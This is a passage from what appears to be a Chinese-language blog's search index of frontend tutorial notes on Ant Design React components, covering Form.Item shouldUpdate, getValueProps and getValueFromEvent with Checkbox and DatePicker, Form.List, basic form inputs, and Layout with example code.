辣度: '小辣', 切不切: '不要' } return ( &lt;div className='wrapper'&gt; &lt;Form form={form} initialValues={initValues} onFinish={(values) =&gt; { console.log(values) }} &gt; &lt;Form.Item name='產品' label='產品'&gt; &lt;Select options={menu} onChange={() =&gt; form.setFieldsValue({ ...initValues })} /&gt; &lt;/Form.Item&gt; {/* 選項區塊 */} &lt;Form.Item shouldUpdate&gt; {/* 自動接收到 form instance 參數 */} {(form) =&gt; { const selectedValue = form.getFieldValue('產品') return selectedValue === '奶茶' ? ( &lt;Form.Item label='甜度' name='甜度'&gt; &lt;Radio.Group&gt; &lt;Radio value='無糖'&gt;無糖&lt;/Radio&gt; &lt;Radio value='少糖'&gt;少糖&lt;/Radio&gt; &lt;Radio value='半糖'&gt;半糖&lt;/Radio&gt; &lt;Radio value='多糖'&gt;多糖&lt;/Radio&gt; &lt;Radio value='全糖'&gt;全糖&lt;/Radio&gt; &lt;/Radio.Group&gt; &lt;/Form.Item&gt; ) : selectedValue === '牛肉麵' ? ( &lt;&gt; &lt;Form.Item label='份量' name='份量'&gt; &lt;Radio.Group&gt; &lt;Radio value='小碗'&gt;小碗&lt;/Radio&gt; &lt;Radio value='大碗'&gt;大碗&lt;/Radio&gt; &lt;/Radio.Group&gt; &lt;/Form.Item&gt; &lt;Form.Item label='酸菜' name='酸菜'&gt; &lt;Radio.Group&gt; &lt;Radio value='不要'&gt;不要&lt;/Radio&gt; &lt;Radio value='要'&gt;要&lt;/Radio&gt; &lt;/Radio.Group&gt; &lt;/Form.Item&gt; &lt;/&gt; ) : selectedValue === '雞排' ? ( &lt;&gt; &lt;Form.Item label='辣度' name='辣度'&gt; &lt;Radio.Group&gt; &lt;Radio value='不辣'&gt;不辣&lt;/Radio&gt; &lt;Radio value='小辣'&gt;小辣&lt;/Radio&gt; &lt;Radio value='大辣'&gt;大辣&lt;/Radio&gt; &lt;Radio value='中辣'&gt;中辣&lt;/Radio&gt; &lt;/Radio.Group&gt; &lt;/Form.Item&gt; &lt;Form.Item label='切不切' name='切不切'&gt; &lt;Radio.Group&gt; &lt;Radio value='不要'&gt;不要&lt;/Radio&gt; &lt;Radio value='要'&gt;要&lt;/Radio&gt; &lt;/Radio.Group&gt; &lt;/Form.Item&gt; &lt;/&gt; ) : null }} &lt;/Form.Item&gt; &lt;Button htmlType='submit'&gt;送出&lt;/Button&gt; &lt;/Form&gt; &lt;/div&gt; )}export default App 這樣子做的好處是不會把整個元件重新渲染，Antd 會自動幫你重新渲染「這個區塊」，想驗證的話可以加上 useEffect 跑跑看： 123456789useEffect(() =&gt; { console.log('render') const timer = setInterval(() =&gt; { setCounter(counter + 1) }, 1000) return () =&gt; { clearInterval(timer) }}) （只有更新 counter 時才會讓元件重新渲染） 再來點優化雖然 shouldUpdate 只會重新渲染指定區塊，但有另外一個問題是「每一次 form 的任何資料改變時都會重新渲染」，因為這是預設行為。 假設現在加上一個購買人的欄位，然後在 shouldUpdate 加上 log，就會發現每次我們每次輸入時都會觸發 shouldUpdate 的重新渲染（或是任何欄位值改變）： 以這個範例來說我們應該只需要在「產品」改變時去重新渲染「選項」的區塊就好，不需要每一次都做更新，所以可以改寫成這種形式： 1234567&lt;Form.Item shouldUpdate={(prevValues, currentValues) =&gt; { return prevValues['產品'] !== currentValues['產品'] }}&gt; {/* ... */}&lt;/Form.Item&gt; shouldUpdate 可以傳入一個 function 並接收到「舊 / 新」的值，接著利用這個來判斷「產品」有沒有被改變即可，當產品一樣時會回傳 false，不會觸發更新，而當產品不一樣時則回傳 true，所以觸發更新。 這樣子就能確保只有在產品改變時才去更新選項的欄位了： 搭配 CheckBox 使用當搭配 &lt;Form.Item&gt; 來使用 checkbox 時，你可能沒辦法在 onFinish 時取出正確的值： 1234567891011121314const App = () =&gt; { return ( &lt;Form onFinish={(values) =&gt; { console.log(values) // }} &gt; &lt;Form.Item name='isJunior'&gt; &lt;Checkbox&gt;Is Junior?&lt;/Checkbox&gt; &lt;/Form.Item&gt; &lt;Button htmlType='submit'&gt;Submit&lt;/Button&gt; &lt;/Form&gt; )} 不管我有沒有勾選，最後的結果都會是 { isJunior: undefined }。 解決方式是在 Form.Item 上新增 valuePropName='checked'： 1234567891011121314const App = () =&gt; { return ( &lt;Form onFinish={(values) =&gt; { console.log(values) }} &gt; &lt;Form.Item name='isJunior' valuePropName='checked'&gt; &lt;Checkbox&gt;Is Junior?&lt;/Checkbox&gt; &lt;/Form.Item&gt; &lt;Button htmlType='submit'&gt;Submit&lt;/Button&gt; &lt;/Form&gt; )} 這樣就可以正確的取出 { isJunior: true } 或 { isJunior: false }。 背後的原理其實是用 getValueProps 和 getValueFromEvent 來實作的，不懂的話建議先看滑去下面理解一下這兩個的用法再拉回來看。 簡單來說就是用 getValueProps 設定表單元件的 value 屬性，接著再用 getValueFromEvent來處理當值改變時該「如何對值做轉換」，直接來看範例： 1234567891011121314151617181920&lt;Form onFinish={(values) =&gt; console.log(values)} initialValues={{ isJunior: true }}&gt; &lt;Form.Item name='isJunior' getValueFromEvent={(event) =&gt; { // onChange 時把 checked 的值取出並回傳 // 這裡回傳的東西就會變成 getValueProps 中的 value return event.target.checked }} getValueProps={(value) =&gt; { // 回傳 \"checked\" 與 \"value\" 的物件 return { checked: value, value } }} &gt; &lt;Checkbox&gt;Is Junior?&lt;/Checkbox&gt; &lt;/Form.Item&gt; &lt;Button htmlType='submit'&gt;Submit&lt;/Button&gt;&lt;/Form&gt; 附註：CodeSandbox 這就跟你自己在寫「Controlled Component」的時候有點類似： 1234567891011121314function App() { const [isJunior, setIsJunior] = useState(false) return ( &lt;label&gt; isJunior &lt;input type='checkbox' checked={isJunior} onChange={(event) =&gt; setIsJunior(event.target.checked)} /&gt; &lt;/label&gt; )} 只不過因為這邊的 &lt;Chekbox&gt; 是放在 &lt;Form.Item&gt; 裡，所以依照 Antd 的規則來說 &lt;Form.Item&gt; 中的元件必須用 value 來控制，而不是 checked。 不過既使是透過 value 來控制，你一樣得傳 checked 屬性給 &lt;Checkbox&gt;，因為他本身還是得有這個屬性，否則可能會看到這段 warning： 總之這背後就是對值做轉換而已，知道原理以後你甚至能這樣子玩： 1234567891011121314151617181920212223242526272829303132const App = () =&gt; { return ( &lt;Form onFinish={(values) =&gt; { // {isJunior: \"Y\"} or {isJunior: \"N\"} console.log(values) }} initialValues={{ // 用自定義的值來表示 isJunior: 'Y' }} &gt; &lt;Form.Item name='isJunior' getValueFromEvent={(event) =&gt; { // 把值從 true / false 轉換成自定義的值 return event.target.checked ? 'Y' : 'N' }} getValueProps={(value) =&gt; { // 把自定義的值來轉換成元件看得懂的值（true /false） return { checked: value === 'Y', value: value === 'Y' } }} &gt; &lt;Checkbox&gt;Is Junior?&lt;/Checkbox&gt; &lt;/Form.Item&gt; &lt;Button htmlType='submit'&gt;Submit&lt;/Button&gt; &lt;/Form&gt; )} 附註：CodeSandbox 這樣子的好處是你可以在按下「Submit」時就直接拿到你想要的值 Y / N，不用再自己對 true / false 來做轉換，因為你在 &lt;Form.Item&gt; 那一層就先做好轉換的動作了。 getValueProps &amp; getValueFromEventgetValueProps簡單來說 getValueProps 是用來讓你重新設定 value 屬性的值（也許可以設定別的屬性，但我想次數真的不多）。 實際可以用在 &lt;Form.Item&gt; 底下的 &lt;DatePicker&gt;： 123456789101112131415161718192021const App = () =&gt; { return ( &lt;Form initialValues={{ date: '08/08/2022' }}&gt; &lt;Form.Item label='date' name='date' getValueProps={(value) =&gt; { // 08/08/2022 console.log('value', value) // 根據初始值設定為空字串 or 新的 moment 物件 return { value: moment(value, 'DD/MM/YYYY', true).isValid() ? moment(value, 'DD/MM/YYYY') : '' } }} &gt; &lt;DatePicker /&gt; &lt;/Form.Item&gt; &lt;Button htmlType='submit'&gt;Submit&lt;/Button&gt; &lt;/Form&gt; )} 會這樣設定是因為 &lt;Form.Item&gt; 預設會自動幫底下的表單元件設定 value 值，官方文件有提到這點： 被设置了 name 属性的 Form.Item 包装的控件，表单控件会自动添加 value（或 valuePropName 指定的其他属性） onChange（或 trigger 指定的其他属性） 可以想成它會自動幫 &lt;DatePicker&gt; 加上 value 和 onChange 事件，像這樣子：&lt;DatePicker value=\"08/08/2022\"/&gt; 但這樣子會有問題，因為 &lt;DatePicker&gt; 是透過 moment 格式的物件來運作的，代表 value 必須是一個 moment 物件，否則的話會直接壞掉（可能會看到 date.clone is not a function 的錯誤） 總而言之透過 getValueProps 我們就能在這一層先對 value 做處理，看是要把它轉換成空字串（這是合法的值） 還是 moment 物件，接著傳給 &lt;DatePicker&gt;，就能避免格式上的問題。 getValueFromEvent剛剛的範例其實會有另外一個問題，就是當我「重新選了一個日期」時，拿到的 value 會變成 moment 物件而不是原本的 08/08/2022： 這邊會有兩個問題： 1. 基於我們一開始寫的判斷可能會產生非預期結果 1234567891011121314&lt;Form.Item label=\"date\" name=\"date\" getValueProps={(value) =&gt; { // 如果拿到 moment 物件 console.log('value', value) // 等於又把 moment 丟進去 moment() 當作值 return { value: moment(value, \"DD/MM/YYYY\", true).isValid() ? moment(value, \"DD/MM/YYYY\") : \"\" }; }}&gt; 2. 表單 Submit 後拿到的是 moment 物件而不是 08/08/2022 要解決這個問題的辦法就是 getValueFromEvent。 人如其名，它的用途就是「在 onChange 時把 event 丟給你，讓你重新設定 value 的值應該要長怎樣？」。也許表達的不是很正確，但我覺得這樣子比較好理解就是了。 附註：對於 DatePicker 來說 getValueFromEvent 會拿到的是 moment，但一般的 &lt;Input&gt; 或是 &lt;Checkbox&gt; 這類的表單元件則會拿到 event 物件。 所以上面的範例可以改寫成這樣： 12345678910111213141516&lt;Form.Item label='date' name='date' getValueFromEvent={(moment) =&gt; { // 這裡回傳什麼，下面的 value 就會拿到什麼 // 所以不需要寫成 `{ value: ... }` 的形式 return moment.format('DD/MM/YYYY') }} getValueProps={(value) =&gt; { return { value: moment(value, 'DD/MM/YYYY', true).isValid() ? moment(value, 'DD/MM/YYYY') : '' } }}&gt; &lt;DatePicker /&gt;&lt;/Form.Item&gt; 附註：CodeSandBox 連結 所以這兩個東西搭配使用的話就可以解決 &lt;DatePicker&gt; 的格式問題囉。","link":"/2022/09/24/antd-form-item/"},{"title":"Ant Design－Form.List","text":"來還債囉。 簡述這個是在處理表單時我覺得比較麻煩的一個部分，再加上官方範例為了展現所有功能所以寫又更複雜了一些，總之我覺得沒有麼好懂，所以寫一篇筆記來記錄一下。 範例簡單來說，假設我有一個表單，我希望他送出去時的資料是長這樣： 12345678910const classRoom = { number: '1A', teacher: 'PeaNu', department: 'CS', students: [ { name: 'PPB', phone: '0912345678' }, { name: 'JoJo', phone: '0912345678' }, { name: 'Dio', phone: '0912345678' } ]} 這時候第一個會碰到的問題是：我要怎麼產生 students 的欄位？畢竟我不可能這樣寫： 12345678&lt;Form.Item label='Students' name='students'&gt; &lt;Form.Item label='Name' name='name'&gt; &lt;Input /&gt; &lt;/Form.Item&gt; &lt;Form.Item label='Phone' name='phone'&gt; &lt;Input /&gt; &lt;/Form.Item&gt;&lt;/Form.Item&gt; 這樣子在提交表單的時候只會被當成是新的欄位，像這樣： 附註：注意多了 name 跟 phone 這兩個欄位 如果還是不太清楚的話可以到這邊看實際範例。 總之呢，這邊要用 antd 提供的 Form.List 來做，先來看寫法： 123456789101112131415161718192021222324252627282930313233343536373839404142&lt;Form form={form} initialValues={initRequest} onFinish={onFinish}&gt; {/* ...略 */} &lt;Form.List name='students'&gt; {(fields, operation) =&gt; { return ( &lt;&gt; {/* 列表欄位 */} {fields.map((field) =&gt; { return ( &lt;React.Fragment key={field.key}&gt; &lt;Divider plain&gt;Students&lt;/Divider&gt; &lt;Form.Item label='Name' name={[field.name, 'name']}&gt; &lt;Input /&gt; &lt;/Form.Item&gt; &lt;Form.Item label='Phone' name={[field.name, 'phone']}&gt; &lt;Input /&gt; &lt;/Form.Item&gt; {/* 刪除按鈕 */} &lt;Form.Item&gt; &lt;Button type='primary' danger onClick={() =&gt; operation.remove(field.name)}&gt; Delete &lt;/Button&gt; &lt;/Form.Item&gt; &lt;/React.Fragment&gt; ) })} {/* 新增按鈕 */} &lt;Form.Item&gt; &lt;Button onClick={() =&gt; operation.add()}&gt; &lt;PlusOutlined /&gt; &lt;/Button&gt; &lt;/Form.Item&gt; &lt;/&gt; ) }} &lt;/Form.List&gt; &lt;Form.Item style={{ textAlign: 'center' }}&gt; &lt;Button type='primary' htmlType='submit'&gt; Submit &lt;/Button&gt; &lt;/Form.Item&gt;&lt;/Form&gt; 附註： name 裡面的陣列順序一定要是 [field.name, \"phone\"] 這樣的順序，否則會有問題。（重要！！！） 不要把 onClick={() =&gt; operation.add()} 寫成 onClick={operation.add}。雖然這樣可以執行，但會有一些額外的問題。 當初我看到這裡也覺得很亂，不過只要一步一步來看就好。 首先 Form.List 的內容是一個 function，他的內容會長這樣： 12345678910// function 中的參數const renderChild = ( fields: Field[], operation: { add, remove, move, }, meta: { errors }) =&gt; React.ReactNode 簡單來說就是用它提供給你的「這個 function」來產生內容，至於參數的部分我會一個一個解釋。 fields這是用來代表列表中的每個欄位，不過它的值可能跟你想得不太一樣，把它印出來的結果是： 之所以會這樣子是因為當我們要渲染 students 時，我們會有多個相同的欄位，像是每個 student 都會有 name 和 phone，這時候如果 fields 也用同樣的名稱的話會「撞名」，所以這邊才會自動產生從 0 遞增的數字來當作欄位名稱。 至於 key 雖然看起來也是從 0 開始遞增的數字，可是有一個很重要的差別是會不停「遞增上去」。 舉例來說，假設我原本有 3 個欄位，現在動態刪除了 1 個欄位，接著再新增 1 個欄位，fields 的內容會變這樣： 他不像 name 一樣會自動「倒退回去」，而是不停的遞增上去來確保「唯一性」。仔細想想就會覺得這也挺合理的，畢竟是 key 嘛？ 這邊也稍微複雜一點，不懂的話到 這邊 自己玩玩看。 operation這個就比較好理解一些了，簡單來說就是物件中有三個 function： add(defaultValue?: any, insertIndex?: number) 新增一筆欄位（初始值 &amp; 插入位置） remove(index: number | number[]) 傳入指定的值來把欄位刪除（通常會傳 field.name） move: (from: number, to: number) 移動欄位的位置 meta這個是搭配 Form.ErrorList 使用的東西，但我看不太懂官方的 範例 是什麼意思。總之這個應該不太常會用到，只要知道一下是跟錯誤有關的東西就行了。 總之以上看完後你應該就對 Form.List 有一定的理解了，剩下的就多練習吧。 另外如果你想要的是比較單純的資料，像這樣： 123{ name: ['name1', 'name2', 'name3']} 可以參考我寫的簡化版範例","link":"/2022/07/26/antd-form-list/"},{"title":"Ant Design－表單相關元件","text":"表單看似簡單，卻充滿各種細節。 基本結構基本結構會由 Form、Form.item 和 Input（表單相關元件） 來組成。 這邊會用一個登入表單來做講解： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100import React from 'react';import { Row, Col, Form, Input ,Button, Checkbox, Space, notification} from \"antd\";import { UserOutlined } from \"@ant-design/icons\";function Main() { // 通過驗證才會 trigger const onFinish = (values: any) =&gt; { notification.success({ message: 'Success!', description: ` username: ${values.username}, password: ${values.passowrd}, remember: ${values.remember} ` }) } // 沒通過驗證時 trigger const onFinishFailed = (errorInfo: any) =&gt; { notification.error({ message: 'Failed', description: ` Please cofirm your content are vaild. ` }) } return ( &lt;&gt; &lt;Row&gt; &lt;Col offset={6} span={12}&gt; &lt;h2&gt;&lt;Space&gt;&lt;UserOutlined /&gt;Log in&lt;/Space&gt;&lt;/h2&gt; &lt;Form name=\"basic\" {/* input 的格線 */} wrapperCol={{span: 24}} {/* label 文字的格線 */} labelCol={{span: 24}} {/* 初始值 */} initialValues={{ remember: true }} onFinish={onFinish} onFinishFailed={onFinishFailed} autoComplete=\"off\" &gt; &lt;Form.Item {/* 要顯示的文字 */} label=\"Username\" // data 的 key name=\"username\" rules={[ { {/* 是否必填 */} required: true, {/* 錯誤訊息文字 */} message: 'Please input your username' } ]} &gt; &lt;Input /&gt; &lt;/Form.Item&gt; &lt;Form.Item {/* 要顯示的文字 */} label=\"Password\" {/* data 的 key */} name=\"passowrd\" rules={[ { {/* 是否必填 */} required: true, {/* 錯誤訊息文字 */} message: 'Please input your password' } ]} &gt; {/* 提醒一下，密碼要寫成這樣 */} &lt;Input.Password /&gt; &lt;/Form.Item&gt; &lt;Form.Item name=\"remember\" {/* 不太懂文件意思，總之加上去後資料跟畫面才會是同步的 */} valuePropName='checked' &gt; &lt;Checkbox&gt;Remember me&lt;/Checkbox&gt; &lt;/Form.Item&gt; &lt;Form.Item&gt; &lt;Row justify='end'&gt; &lt;Col&gt;&lt;Button type='primary' htmlType='submit'&gt;Submit&lt;/Button&gt;&lt;/Col&gt; &lt;/Row&gt; &lt;/Form.Item&gt; &lt;/Form&gt; &lt;/Col&gt; &lt;/Row&gt; &lt;/&gt; );}export default Main; 這個範例有用到的東西： onFinish 通過驗證的 handler onFinishFailed 沒通過驗證的 handler &lt;Form wrapperCol /&gt; 對底下的所有 &lt;input /&gt; 做佈局設定 &lt;Form labelCol /&gt; 對底下的所有 label 文字做佈局設定 &lt;Form initialValues /&gt; 欄位的初始值 &lt;Form.Item label /&gt; label 文字 &lt;Form.Item name /&gt; 資料的 key 值 &lt;Form.Item rules /&gt; 跟驗證相關的東西 &amp; 提示訊息 &lt;Form.Item valuePropName /&gt; 會用到 check 的話要記得設定這個 Radio會由 Radio.Group 和 Group 來組成。 123456789101112131415161718192021import React, { useState } from 'react'import { Form, Input, Button, Radio } from 'antd'import { UserOutlined } from '@ant-design/icons'function Main() { const [value, setValue] = useState(1) const onChange = (e: any) =&gt; setValue(e.target.value) return ( &lt;&gt; &lt;Radio.Group name='type' onChange={onChange} value={value}&gt; &lt;Radio value={1}&gt;A&lt;/Radio&gt; &lt;Radio value={2}&gt;B&lt;/Radio&gt; &lt;Radio value={3}&gt;C&lt;/Radio&gt; &lt;Radio value={4}&gt;D&lt;/Radio&gt; &lt;/Radio.Group&gt; &lt;/&gt; )}export default Main 也可以改用 options 的方式來設定： 12345678910111213141516171819202122232425262728293031323334353637383940import React, { useState } from 'react';import { Form, Input ,Button, Radio } from \"antd\";import { UserOutlined } from \"@ant-design/icons\";function Main() { const options = [ { label: 'A', value: 1, disabled: false }, { label: 'B', value: 2, disabled: false }, { label: 'C', value: 3, disabled: false }, { label: 'D', value: 4, disabled: false }, { label: 'E', value: 5, disabled: true } ] const [value, setValue] = useState(1); const onChange = (e: any) =&gt; setValue(e.target.value); return &lt;Radio.Group name=\"type\" onChange={onChange} value={value} options={options} /&gt; );}export default Main; Checkbox基本用法，跟 Radio 差不多。 123456789101112131415161718import React, { useState } from 'react'import { Form, Input, Button, Checkbox } from 'antd'import { UserOutlined } from '@ant-design/icons'function Main() { const [value, setValue] = useState(1) const onChange = (e: any) =&gt; setValue(e.target.value) return ( &lt;Checkbox.Group name='options'&gt; &lt;Checkbox value={1}&gt;Option1&lt;/Checkbox&gt; &lt;Checkbox value={2}&gt;Option2&lt;/Checkbox&gt; &lt;Checkbox value={3}&gt;Option3&lt;/Checkbox&gt; &lt;/Checkbox.Group&gt; )}export default Main 一次全選直接看 code： 123456789101112131415161718192021222324252627282930313233343536373839404142import React, { useState } from 'react'import { Checkbox } from 'antd'const plainOptions = ['Apple', 'Orange', 'Pear']const defaultCheckList = ['Apple', 'Orange']function Main() { // 是否有選擇一個以上 const [indeterminate, setIndeterminate] = useState(true) // 是否全選 const [checkAll, setCheckAll] = useState(false) // 預設選項 const [checkList, setCheckList] = useState(defaultCheckList) const onCheckAllChange = (e: any) =&gt; { setCheckList(e.target.checked ? plainOptions : []) setIndeterminate(false) setCheckAll(e.target.checked) } const onChnage = (list: any) =&gt; { setCheckList(list) // !! 的用途是只要是 falsy 就回傳 false // 這邊是要確認目前長度 &lt; 所有選項長度 // 只是利用短路運算先判斷 list.length 是否為 0，藉此省掉後面的比對。 setIndeterminate(!!list.length &amp;&amp; list.length &lt; plainOptions.length) // 用長度來判斷全選 setCheckAll(list.length === plainOptions.length) } return ( &lt;&gt; &lt;Checkbox indeterminate={indeterminate} onChange={onCheckAllChange} checked={checkAll}&gt; Check All &lt;/Checkbox&gt; {/* 改用 options 渲染 */} &lt;Checkbox.Group name='options' options={plainOptions} value={checkList} onChange={onChnage} /&gt; &lt;/&gt; )}export default Main 下拉選單會由 Select 和 Optnio 來組成： 12345678910111213141516171819import React, { useState } from 'react'import { Select } from 'antd'const { Option } = Selectfunction Main() { const handleChange = (value: string) =&gt; console.log(value) return ( &lt;Select defaultValue='peanu' onChange={handleChange}&gt; &lt;Option value='peanu'&gt;PeaNU&lt;/Option&gt; &lt;Option value='ppb'&gt;PPB&lt;/Option&gt; &lt;Option value='et'&gt;ET&lt;/Option&gt; &lt;Option value='garry'&gt;Garry&lt;/Option&gt; &lt;/Select&gt; )}export default Main 改用 optnios 屬性來渲染（據說效能比較好）： 123456789101112131415161718192021222324252627282930313233import React, { useState } from 'react'import { Select } from 'antd'const options = [ { label: 'PeaNu', value: 'peanu' }, { label: 'PPB', value: 'ppb' }, { label: 'ET', value: 'et' }, { label: 'Garry', value: 'garry' }]function Main() { const handleChange = (value: string) =&gt; console.log(value) return ( &lt;&gt; &lt;Select options={options} defaultValue='peanu' onChange={handleChange} /&gt; &lt;/&gt; )}export default Main 介紹幾個 Input 的 props123456&lt;Input readOnly={true} /&gt; // 看起來可以輸入，但不行&lt;Input disabled={true} /&gt; // 禁用&lt;Input maxLength={20} /&gt; // 最大長度&lt;Input showCount={true} /&gt; // 顯示長度&lt;Input prefix={&lt;UserOutlined /&gt;} /&gt; // 在前面插入 icon&lt;Input suffix={&lt;UserOutlined /&gt;}/&gt; // 在後面插入 icon 改變 password 的 icon：1234567891011121314151617import React, { useState } from 'react'import { Input } from 'antd'import { EyeFilled, EyeInvisibleFilled } from '@ant-design/icons'function Main() { return ( &lt;&gt; &lt;Input.Password iconRender={(visible: boolean) =&gt; { return visible ? &lt;EyeFilled /&gt; : &lt;EyeInvisibleFilled /&gt; }} /&gt; &lt;/&gt; )}export default Main 和 Form 相關的屬性initialValues 設定欄位的初始值附註：提醒一下，key 會對應到 Form.Item 的 name 屬性 1234567891011121314151617181920212223242526272829303132import React, { useState } from 'react'import { Input, Form, Radio } from 'antd'import { EyeFilled, EyeInvisibleFilled } from '@ant-design/icons'const initialValues = { username: 'PeaNu', password: '123456789', gender: 'man'}function Main() { return ( &lt;&gt; &lt;Form autoComplete='off' initialValues={initialValues}&gt; &lt;Form.Item label='Username' name='username'&gt; &lt;Input /&gt; &lt;/Form.Item&gt; &lt;Form.Item label='Passowrd' name='password'&gt; &lt;Input.Password /&gt; &lt;/Form.Item&gt; &lt;Form.Item name='gender'&gt; &lt;Radio.Group&gt; &lt;Radio value='man'&gt;Man&lt;/Radio&gt; &lt;Radio value='female'&gt;Female&lt;/Radio&gt; &lt;/Radio.Group&gt; &lt;/Form.Item&gt; &lt;/Form&gt; &lt;/&gt; )}export default Main validateTrigger如名，設定什麼時候觸發驗證的 handler，預設是 onChange。 如果我想讓 onBlur 時也觸發，可以這樣做： 1234567891011121314151617181920212223242526272829303132333435363738394041424344import React from 'react'import { Input, Form, Radio } from 'antd'function Main() { return ( &lt;&gt; {/* 加上 validateTrigger */} &lt;Form autoComplete='off' validateTrigger={['onBlur', 'onChnage']}&gt; &lt;Form.Item label='Username' name='username' rules={[ { required: true, message: 'Please input the username' } ]} &gt; &lt;Input /&gt; &lt;/Form.Item&gt; &lt;Form.Item label='Passowrd' name='password' rules={[ { required: true, message: 'Please input the password' } ]} &gt; &lt;Input.Password /&gt; &lt;/Form.Item&gt; &lt;Form.Item name='gender'&gt; &lt;Radio.Group&gt; &lt;Radio value='man'&gt;Man&lt;/Radio&gt; &lt;Radio value='female'&gt;Female&lt;/Radio&gt; &lt;/Radio.Group&gt; &lt;/Form.Item&gt; &lt;/Form&gt; &lt;/&gt; )}export default Main form這個要搭配 useForm() 來使用，它會回傳一個 instance，可以拿這個 instance 做一些事情。例如：當你想一次設定很多個欄位的預設值 1234567891011121314151617181920212223242526272829303132import React from 'react'import { Form, Input, Button } from 'antd'function Main() { // get instance const [form] = Form.useForm() // 設定預設值 form.setFieldsValue({ username: 'PeaNu', password: '123456789' }) return ( &lt;&gt; {/* 記得要放到 form 屬性裡 */} &lt;Form form={form} autoComplete='off'&gt; &lt;Form.Item label='Username' name='username'&gt; &lt;Input /&gt; &lt;Input.Search /&gt; &lt;/Form.Item&gt; &lt;Form.Item label='Password' name='password'&gt; &lt;Input.Password /&gt; &lt;/Form.Item&gt; &lt;/Form&gt; {/* 點擊時顯示所有欄位的資料 */} &lt;Button onClick={() =&gt; console.log(form.getFieldsValue())}&gt;Check data&lt;/Button&gt; &lt;/&gt; )}export default Main 因為可以用的東西很多就不一一列出，有需要的話參考這裡。","link":"/2022/05/17/antd-form/"},{"title":"Ant Design－Layout","text":"熟了以後就能快速刻出 Layout。 基本結構1234567891011121314import { Layout } from 'antd'function App() { return ( &lt;Layout&gt;This is header&lt;/Layout.Header&gt; &lt;Layout&gt; &lt;Layout.Sider&gt;This is side bar&lt;/Layout.Sider&gt; &lt;Layout.Content&gt;This is content&lt;/Layout.Content&gt; &lt;/Layout&gt; &lt;Layout.Footer&gt;This is Footer&lt;/Layout.Footer&gt; &lt;/Layout&gt; )}export default App 主要的功能是建立結構與 HTML Semantic Tag，不過因為有預設樣式所以看起來會很奇葩： 這時候你可以直接用預設的 className 去改，亦或是加上自己的 className 來改，這裡我選擇後者： 1234567891011121314151617181920function App() { return ( &lt;Layout className='demo-layout-wrapper'&gt; &lt;Layout.Header className='demo-layout-header'&gt; &lt;h2&gt;This is header&lt;/h2&gt; &lt;/Layout.Header&gt; &lt;Layout&gt; &lt;Layout.Sider className='demo-layout-sider'&gt; &lt;h2&gt;This is side bar&lt;/h2&gt; &lt;/Layout.Sider&gt; &lt;Layout.Content className='demo-layout-content'&gt; &lt;h2&gt;This is content&lt;/h2&gt; &lt;/Layout.Content&gt; &lt;/Layout&gt; &lt;Layout.Footer className='demo-layout-footer'&gt; &lt;h2&gt;This is Footer&lt;/h2&gt; &lt;/Layout.Footer&gt; &lt;/Layout&gt; )} 123456789101112131415161718192021222324252627282930313233343536h2 { color: white; text-align: center; margin-bottom: 0;}.demo-layout-wrapper { color: white; .demo-layout-header { color: white; background-color: #5dadfb; text-align: center; height: 70px; } .demo-layout-sider { background-color: #73b9fc; height: calc(100vh - 150px); .ant-layout-sider-children { display: flex; flex-direction: column; justify-content: center; } } .demo-layout-content { background-color: #419ffb; display: flex; flex-direction: column; justify-content: center; text-align: center; } .demo-layout-footer { background-color: #94c7f8; height: 80px; font-size: 0.8rem; }} 範例邊看文件邊練習後，大概就能做出基本的網站樣貌： 原始碼： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899import { Breadcrumb, Button, CheckboxOptionType, Col, Image, Layout, Menu, Radio, Rate, Row, Spin} from 'antd'import { ItemType } from 'antd/lib/menu/hooks/useItems'import { useEffect, useState } from 'react'function App() { const [loading, setLoading] = useState&lt;boolean&gt;(true) const menu: ItemType[] = Array(5) .fill(null) .map((_, index) =&gt; ({ key: index + 1, label: `Nav ${index + 1}` })) const options: CheckboxOptionType[] = [ { label: 'XXS', value: 'xxs' }, { label: 'XS', value: 'xs' }, { label: 'S', value: 's' }, { label: 'M', value: 'm' }, { label: 'L', value: 'l' }, { label: 'XL', value: 'xl' }, { label: 'XXL', value: 'xxl' } ] useEffect(() =&gt; { setTimeout(() =&gt; { setLoading(false) }, 1000) }, []) return ( &lt;Layout className='demo-layout-wrapper'&gt; &lt;Layout.Header className='demo-layout-header'&gt; &lt;div className='demo-layout-header-left'&gt; &lt;div className='demo-layout-header-logo'&gt;&lt;/div&gt; &lt;/div&gt; &lt;div className='demo-layout-header-right'&gt; &lt;Menu mode='horizontal' items={menu} /&gt; &lt;/div&gt; &lt;/Layout.Header&gt; &lt;Layout.Content className='demo-layout-content'&gt; &lt;Breadcrumb&gt; &lt;Breadcrumb.Item&gt;Home&lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt; &lt;a href='#'&gt;Product&lt;/a&gt; &lt;/Breadcrumb.Item&gt; &lt;Breadcrumb.Item&gt;Product Detail&lt;/Breadcrumb.Item&gt; &lt;/Breadcrumb&gt; &lt;div className='demo-layout-content-main'&gt; &lt;Spin size='large' spinning={loading}&gt; &lt;h2 className='demo-layout-content-main-title'&gt;Product Tiitle&lt;/h2&gt; &lt;div className='demo-layout-content-main-detail'&gt; &lt;Row gutter={[50, 50]}&gt; &lt;Col span={24} lg={8}&gt; &lt;Image width={'100%'} src='https://photo.queenshop.com.tw/01039398/01039398-h.jpg' /&gt; &lt;/Col&gt; &lt;Col span={24} lg={16}&gt; &lt;div className='demo-layout-content-main-detail-rate'&gt; &lt;Rate allowHalf disabled defaultValue={4} /&gt; &lt;/div&gt; &lt;p className='demo-layout-content-main-detail-description'&gt; Lorem ipsum, dolor sit amet consectetur adipisicing elit. Quia provident ullam obcaecati alias vel vitae excepturi similique dolorum itaque corrupti, deserunt eligendi temporibus voluptates commodi! Sed quam aliquam in accusantium? &lt;/p&gt; &lt;h3 className='demo-layout-content-main-detail-prize'&gt; Prize: &lt;span&gt;13.00$&lt;/span&gt; &lt;/h3&gt; &lt;Radio.Group options={options} /&gt; &lt;div className='demo-layout-content-main-detail-button'&gt; &lt;Button&gt;Buy it now&lt;/Button&gt; &lt;/div&gt; &lt;/Col&gt; &lt;/Row&gt; &lt;/div&gt; &lt;/Spin&gt; &lt;/div&gt; &lt;/Layout.Content&gt; &lt;Layout.Footer className='demo-layout-footer'&gt; &lt;p&gt;Copyright © 2022. Dont know what is&lt;/p&gt; &lt;/Layout.Footer&gt; &lt;/Layout&gt; )}export default App 